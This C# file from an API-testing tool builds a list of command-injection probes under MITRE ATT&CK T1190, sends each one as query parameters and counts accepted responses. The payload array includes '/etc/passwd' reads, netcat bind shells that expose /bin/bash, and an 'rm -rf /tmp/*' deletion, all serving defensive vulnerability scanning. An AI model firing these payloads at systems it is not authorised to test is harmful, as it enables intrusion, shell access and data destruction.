namespace API_Tester;

public partial class MainPage
{
    /*
    MITRE ATT&CK T1190 – Exploit Public-Facing Application Payloads

    Purpose:
    Provides payloads used to test for vulnerabilities in public-facing
    application interfaces. These payloads simulate attempts to exploit
    command execution or input handling weaknesses consistent with
    MITRE ATT&CK technique T1190 (Exploit Public-Facing Application).

    Threat Model:
    Public-facing applications are common targets for attackers attempting
    to exploit weaknesses in input handling, command execution, or backend
    processing logic. If user-controlled input is improperly handled,
    attackers may be able to inject commands or manipulate server behavior.

    Example attack behaviors include:

        - injecting shell command separators
        - executing system commands through application inputs
        - probing for command execution or time-based responses
        - attempting to retrieve system information

    Test Strategy:
    The payloads returned by this method simulate common command injection
    or execution probes such as:

        - "; id" to attempt command chaining
        - "&& whoami" to attempt conditional execution
        - "| cat /etc/passwd" to attempt command piping
        - "$(sleep 2)" to detect command substitution or timing responses

    These payloads help identify whether the application improperly
    incorporates user input into shell commands or system-level operations.

    Potential Impact:
    If vulnerabilities exist, attackers may be able to:

        - execute arbitrary system commands
        - retrieve sensitive system files
        - escalate privileges or compromise the host system
        - pivot to other systems within the environment

    Expected Behavior:
    Applications should:

        - never pass unsanitized input to system commands
        - validate and sanitize all external input
        - use safe APIs instead of shell execution where possible
        - implement strong input validation and parameterization
        - monitor and log suspicious command execution attempts
    */
    
    private static string[] GetMitreT1190Payloads() =>
    [
        "; id",
        "&& whoami",
        "| cat /etc/passwd",
        "$(sleep 2)",
        "; uname -a",
        "&& netstat -an",
        "| ps aux",
        "$(ping 127.0.0.1)",
        "`ping -c 4 127.0.0.1`",
        "; nc -l -p 4444 -e /bin/bash",
        "| netstat -an",
        "`echo 'Bad' > /tmp/hacked.txt`",
        "; rm -rf /tmp/*",
        "`nc -l -p 8080 -e /bin/bash`"
    ];

    private HttpRequestMessage FormatMitreT1190Request(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["cmd"] = payload,
            ["action"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunMitreT1190TestsAsync(Uri baseUri)
    {
        var payloads = GetMitreT1190Payloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatMitreT1190Request(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: exploit-facing input accepted on {accepted}/{payloads.Length} probes."
            : "No obvious exploit-facing acceptance pattern across tested payloads.");

        return FormatSection("MITRE ATT&CK T1190", baseUri, findings);
    }
}
